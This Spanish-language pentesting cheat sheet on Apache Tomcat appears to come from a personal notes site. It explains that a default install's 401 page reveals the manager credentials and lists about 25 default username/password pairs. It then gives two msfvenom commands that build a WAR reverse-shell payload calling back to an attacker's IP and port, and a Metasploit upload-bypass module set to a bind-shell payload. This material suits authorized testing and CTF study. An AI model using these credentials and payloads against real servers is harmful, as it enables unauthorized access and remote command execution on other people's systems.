---
title: "Tomcat"
layout: "single"
category: "Servicios comunes"
slug: "servicios-comunes/apache-tomcat"
date: "2025-09-30"
---

### Acceso por defecto al portal

Con una instalación por defecto de tomcat, al intentar entrar al panel de administración, si no sabemos la contraseña, al pulsar en **cancel**, por defecto nos redirige a un fichero que dice: **401 Unauthorized** y más abajo nos muestra el **usuario y contraseña**

### Credenciales por defecto
| Username | Password   |
| -------- | ---------- |
| admin    | password   |
| admin    | <blank>    |
| admin    | Password1  |
| admin    | password1  |
| admin    | admin      |
| admin    | tomcat     |
| both     | tomcat     |
| manager  | manager    |
| role1    | role1      |
| role1    | tomcat     |
| role     | changethis |
| root     | Password1  |
| root     | changethis |
| root     | password   |
| root     | password1  |
| root     | r00t       |
| root     | root       |
| root     | toor       |
| tomcat   | tomcat     |
| tomcat   | s3cret     |
| tomcat   | password1  |
| tomcat   | password   |
| tomcat   | <blank>    |
| tomcat   | admin      |
| tomcat   | changethis |
### Reverse shell tomcat con msfvenom
#### Método 1
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o revshell.war
```

#### Método 2
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o revshell.war
```

### JSP Payload (metasploit)
```bash
use exploit/multi/http/tomcat_jsp_upload_bypass
set payload java/jsp_shell_bind_tcp
```
